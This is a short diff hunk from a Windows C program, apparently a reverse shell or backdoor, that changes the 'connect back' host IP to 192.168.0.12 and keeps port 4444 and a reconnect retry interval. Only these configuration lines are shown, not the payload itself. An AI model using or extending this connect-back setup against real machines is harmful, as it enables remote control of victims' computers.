@@ -2,7 +2,7 @@
 #include <windows.h>
 
 // connect back to this ip:port
-#define HOST_IP "192.168.1.194"
+#define HOST_IP "192.168.0.12"
 #define HOST_PORT 4444
 
 #define RETRY_MS 5000
